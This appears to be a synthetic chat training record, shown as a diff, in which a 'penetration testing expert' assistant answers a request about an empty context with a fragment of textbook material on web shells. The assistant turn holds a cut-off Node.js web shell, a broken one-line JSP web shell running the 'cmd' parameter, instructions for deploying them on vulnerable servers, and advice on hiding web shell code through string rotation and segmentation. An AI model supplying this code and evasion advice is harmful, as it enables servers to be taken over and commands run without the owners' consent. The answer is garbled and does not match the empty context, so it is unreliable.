@@ -1,0 +1,28 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Describe the steps or process outlined in the following text: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+}).listen(8080, () => {
+console.log('Web shell running on http://localhost:
+});
+This Node.js script sets up a web server that executes commands passed via
+the cmd query string parameter and returns the output.
+The JSP script in Example 6-4 creates a web shell that executes commands
+passed via the cmd query string parameter and returns the output.
+Example 6-4 JSP Web Shell Example
+<%
+Runtime.getRuntime().exec(request.getParameter("cmd")
+%>
+To use these web shells, you would deploy the respective script on a
+vulnerable web server and then access them via a web browser or an HTTP
+client, passing the desired command as a query string parameter.
+You can obscure the actual commands or code within a web shell by
+manipulating strings or using indirect references. You can use string
+rotations and segmentation by breaking up strings into smaller parts or
+rotating characters to make them unreadable without reconstruction.
